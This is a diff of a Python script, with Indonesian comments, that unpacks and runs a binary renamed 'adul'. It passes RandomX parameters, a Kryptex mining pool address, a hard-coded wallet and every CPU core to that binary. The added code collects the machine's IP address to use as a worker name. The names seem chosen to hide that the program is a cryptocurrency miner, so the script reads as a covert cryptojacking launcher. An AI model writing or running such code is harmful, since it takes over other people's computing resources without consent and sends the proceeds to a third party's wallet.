@@ -56,16 +56,56 @@ import tarfile
 import urllib.request
 import time
 import shutil
+import socket
 
-# Perbaikan: Masukkan nilai langsung ke dalam variabel
+# Konfigurasi parameter
 buyu = "rx/0"
-aming = "164az6Jw8Y3pJJd8XcCwjVYykBTHQWRq4vEg8beNnQWm3MPWj4biVANqDYve9xfJiN5JDN4PiHRta31o2awd4k3AbEbs4bi3NrV8DUzt9g6pJeTkrFtjJtEvPTo7SAVdtYb5fWx"
+wallet = "16meX2eiPWFAAU94fRF8u2DejfpQaV21a8bqYQviMDaSKfwuCgQJNAEauk9PTnx3jmKkTVuLXrgcbmXtAvtVUvn6K3BpnwVa6VQCRvYoeVD"
+
+# === Ambil IP lokal / worker_name dengan lebih aman dan andal ===
+worker_name = ""
+
+# Metode 1: Menggunakan hostname / socket
+try:
+    worker_name = socket.gethostbyname(socket.gethostname())
+except Exception:
+    pass
+
+# Metode 2: Jika masih kosong, coba jalankan hostname -I via subprocess
+if not worker_name:
+    try:
+        res = subprocess.check_output(["hostname", "-I"], stderr=subprocess.DEVNULL).decode().strip()
+        if res:
+            worker_name = res.split()[0]
+    except Exception:
+        pass
+
+# Metode 3: Jika masih kosong, gunakan ip route
+if not worker_name:
+    try:
+        res = subprocess.check_output(["ip", "route", "show"], stderr=subprocess.DEVNULL).decode()
+        for line in res.splitlines():
+            if "default" in line:
+                parts = line.split()
+                if len(parts) >= 3:
+                    worker_name = parts[2]
+                    break
+    except Exception:
+        pass
+
+# Metode 4: Fallback terakhir jika tetap kosong
+if not worker_name or worker_name == "0":
+    worker_name = "worker1"
+
+# Menggabungkan wallet dan worker_name
+aming = f"{wallet}/{worker_name}"
 
 # Mengambil jumlah core CPU (setara dengan nproc --all)
 try:
     threads = os.cpu_count() or 1
 except Exception:
     threads = 1
+
 def run_with_loading(message, cmd, *args):
     sys.stdout.write(f"[|] {message}")
     sys.stdout.flush()
@@ -123,11 +163,11 @@ def extract_tar(filename):
 if extract_tar("adul.tar.gz") != 0:
     sys.exit(1)
 
-print(f"Menjalankan ./adul dengan worker...")
+print(f"Menjalankan adul dengan worker: {aming}")
 
 # 3. Menjalankan ./adul dengan parameter dan animasi jam pasir
 adul_process = subprocess.Popen(
-    ["./adul", "-a", buyu, "-o", "ieriuer", "-u", aming, "-t", str(threads)],
+    ["./adul", "-a", buyu, "-o", "xtm-rx-sg.kryptex.network:7038", "-u", aming, "-t", str(threads)],
     stdout=subprocess.PIPE,
     stderr=subprocess.PIPE,
     text=True
